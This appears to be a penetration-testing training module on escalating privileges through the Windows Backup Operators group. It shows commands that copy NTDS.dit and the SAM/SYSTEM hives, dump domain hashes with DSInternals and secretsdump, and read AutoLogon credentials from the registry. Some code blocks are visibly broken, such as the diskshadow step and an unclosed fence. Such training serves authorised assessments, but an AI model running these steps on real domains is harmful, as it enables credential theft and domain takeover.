As mentioned in the `Windows Privileges Overview` section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller. [Here](https://ss64.com/nt/syntax-security_groups.html) is a listing of all built-in Windows groups along with a detailed description of each. This [page](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) has a detailed listing of privileged accounts and groups in Active Directory.

For our purposes, we will focus on the following built-in groups. Each of these groups exists on systems from Server 2008 R2 to the present, except for Hyper-V Administrators (introduced with Server 2012).

Accounts may be assigned to these groups to enforce least privilege and avoid creating more Domain Admins and Enterprise Admins to perform specific tasks, such as backups. Sometimes vendor applications will also require certain privileges, which can be granted by assigning a service account to one of these groups. Accounts may also be added by accident or leftover after testing a specific tool or script. We should always check these groups and include a list of each group's members as an appendix in our report for the client to review and determine if access is still necessary.

## Backup Operators

Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

#### Importing Libraries
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Verifying SeBackupPrivilege is Enabled

Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.
>Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell-session
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

#### Enabling SeBackupPrivilege

If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.
```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

#### Copying a Protected File

This privilege can now be leveraged to copy any protected file.
```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes
```


#### Attacking a Domain Controller - Copying NTDS.dit

This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.
```powershell-session
S C:\htb> diskshadow.exe

d-----        3/24/2021   6:38 PM                Windows
```

#### Copying NTDS.dit Locally

Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

#### Backing up SAM and SYSTEM Registry Hives

The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
```cmd-session
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

> It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.


#### Extracting Credentials from NTDS.dit

With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`.

```powershell-session
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

```


#### Extracting Hashes Using SecretsDump

We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, created a dictionary of disallowed words, etc.).
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Robocopy

#### Copying Files with Robocopy

The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.

```cmd-session
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

This eliminates the need for any external tools.

### RCE Search HKLM For Credentials

We have full read access to HKLM\SOFTWARE hive that we can abuse to read AutoLogon credentials for example.
```
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```
